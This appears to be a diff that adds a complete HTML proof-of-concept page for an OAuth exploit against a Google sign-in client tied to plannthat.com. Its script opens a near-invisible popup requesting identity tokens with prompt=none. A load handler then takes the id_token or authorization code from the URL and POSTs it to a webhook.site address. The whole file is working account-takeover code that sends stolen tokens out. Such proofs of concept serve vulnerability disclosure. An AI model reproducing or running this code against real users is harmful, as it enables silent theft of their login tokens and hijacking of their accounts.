@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OAuth Exploit PoC</title>
+</head>
+<body>
+    <h3>PoC Running...</h3>
+    <button onclick="exploit()">START EXPLOIT</button>
+
+    <script>
+        function exploit() {
+            window.open(
+                "https://accounts.google.com/o/oauth2/v2/auth?client_id=194129245325-91aovs2hfgphsjdra11qapj5fo20pvgg.apps.googleusercontent.com" +
+                "&redirect_uri=storagerelay%3A%2F%2Fhttps%2Fwww.plannthat.com%3Fid%3Dauth272142" +
+                "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile" +
+                "&response_type=id_token,code" +
+                "&prompt=none",
+                "",
+                "width=10,height=10"
+            );
+        }
+
+        // Capture fragment or query and send to webhook
+        window.addEventListener('load', () => {
+            const hash = window.location.hash;     // #id_token=...
+            const query = window.location.search;  // ?code=...
+
+            const data = hash || query;
+
+            if (data) {
+                fetch("https://webhook.site/3b235cad-e271-481c-a4e2-e3643dd95617", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "text/plain"
+                    },
+                    body: data
+                });
+            }
+        });
+    </script>
+</body>
+</html>
